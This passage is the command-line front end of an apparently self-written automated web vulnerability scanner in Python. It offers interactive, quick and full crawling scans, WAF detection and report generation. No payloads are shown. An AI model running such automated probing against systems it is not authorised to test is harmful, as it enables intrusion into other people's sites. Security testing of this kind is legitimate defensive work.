    """Interactive mode - asks user for input"""
    banner()
    separator()

    target = prompt("Enter target URL (e.g., http://example.com/page.php?id=1)").strip()
    if not target:
        error("No URL provided!")
        return

    if not target.startswith(("http://", "https://")):
        target = "http://" + target

    separator()
    info("Configuration Options (press Enter for defaults):")
    separator()

    try:
        threads = int(prompt("Threads [default: 10]") or "10")
    except:
        threads = 10

    try:
        timeout = int(prompt("Timeout in seconds [default: 10]") or "10")
    except:
        timeout = 10

    try:
        depth = int(prompt("Crawl depth [default: 2]") or "2")
    except:
        depth = 2

    separator()
    info("Starting automated scan...")
    info("This may take a few minutes depending on the target size.")
    separator()

    start_time = time.time()

    try:
        scanner = AutoScanner(target, threads=threads, timeout=timeout, crawl_depth=depth)
        scanner.run_scan()

        elapsed = time.time() - start_time
        info(f"Scan completed in {elapsed:.2f} seconds")

        scanner.print_summary()

        separator()
        info("Generating reports...")
        scanner.generate_html_report()
        scanner.generate_json_report()

        separator()
        success("Scan completed successfully!")

    except KeyboardInterrupt:
        print("\n" + c(Colors.WARNING, "[!] Scan interrupted by user"))
    except Exception as e:
        error(f"Scan failed: {str(e)}")


def quick_scan(url, threads=10, timeout=10):
    """Quick scan - single URL, no prompts"""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    info(f"Quick scanning: {url}")

    scanner = AutoScanner(url, threads=threads, timeout=timeout, crawl_depth=1)

    if scanner.has_params(url):
        scanner.discovered_urls.add(url)

    scanner.detect_waf()
    results = scanner.run_scan()
    scanner.print_summary()
    scanner.generate_html_report("quick_scan_report.html")
    scanner.generate_json_report("quick_scan_report.json")

    return results


def full_scan(url, threads=20, timeout=15, depth=3):
    """Full scan - comprehensive scan with crawling"""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    banner()
    separator()
    info(f"Full scan initiated on: {url}")
    info(f"Config: threads={threads}, timeout={timeout}, depth={depth}")
    separator()

    start_time = time.time()

    scanner = AutoScanner(url, threads=threads, timeout=timeout, crawl_depth=depth)
    scanner.run_scan()

    elapsed = time.time() - start_time
    separator()
    info(f"Scan completed in {elapsed:.2f} seconds")

    scanner.print_summary()

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    scanner.generate_html_report(f"fullscan_{timestamp}.html")
    scanner.generate_json_report(f"fullscan_{timestamp}.json")

    return scanner.results


def show_help():
    """Display help information"""
    banner()
    print(c(Colors.OKCYAN, """
    +════════════════════════════════════════════════════════════╗
    |  USAGE:                                                     ║
    +════════════════════════════════════════════════════════════╝

      Interactive Mode (with prompts):
          python auto_scanner.py

      Quick Scan (single URL):
          python auto_scanner.py <URL>

      Full Scan (with crawling):
          python auto_scanner.py <URL> --full
          python auto_scanner.py <URL> -f

      Custom Options:
          python auto_scanner.py <URL> --threads 20
          python auto_scanner.py <URL> --timeout 15
          python auto_scanner.py <URL> --depth 3

      Examples:
          python auto_scanner.py http://test.com/page.php?id=1
          python auto_scanner.py http://test.com --full
          python auto_scanner.py http://test.com -f -t 30
    """))


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Automated Web Vulnerability Scanner", add_help=False)
    parser.add_argument("url", nargs="?", help="Target URL to scan")
    parser.add_argument("-h", "--help", action="store_true", help="Show help")
    parser.add_argument("-f", "--full", action="store_true", help="Full scan with crawling")
    parser.add_argument("--threads", "-t", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    parser.add_argument("--depth", "-d", type=int, default=2, help="Crawl depth (default: 2)")

    args = parser.parse_args()

    if args.help or len(sys.argv) == 1:
        show_help()
        if not sys.argv[1:] or (len(sys.argv) == 2 and sys.argv[1] in ["-h", "--help"]):
            sys.exit(0)
        interactive_mode()
    elif args.url:
        if args.full:
            full_scan(args.url, threads=args.threads, timeout=args.timeout, depth=args.depth)
        else:
            quick_scan(args.url, threads=args.threads, timeout=args.timeout)
    else:
        interactive_mode()
